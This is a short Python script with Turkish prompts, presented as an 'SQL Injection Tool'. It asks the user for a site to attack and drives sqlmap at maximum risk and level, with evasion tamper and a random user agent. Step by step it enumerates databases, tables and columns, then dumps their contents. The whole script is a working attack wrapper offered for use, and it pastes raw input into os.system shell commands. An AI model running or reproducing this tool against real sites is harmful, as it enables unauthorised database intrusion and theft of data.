import time
import os

print("[--İNFO--] SQL Injection Tool")
print("[--İNFO--] Coded by Salihvr")


print("")
site = input("[+] Saldırı yapılacak site: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch --dbs")

print("")
database = input("[+] Database ismi giriniz: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch -D " + database + " --tables")

print("")
tables = input("[+] Tablo ismi giriniz: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch -D " + database + " -T" + tables + " --column")

print("")
kolon = input("[+] Kolon ismi giriniz: ")
print("")

os.system("sqlmap.py -u " + site + " --risk=3 --level=5 --tamper=between --random-agent --no-cast --batch -D " + database + " -T" + tables + " -C" + kolon + " --dump")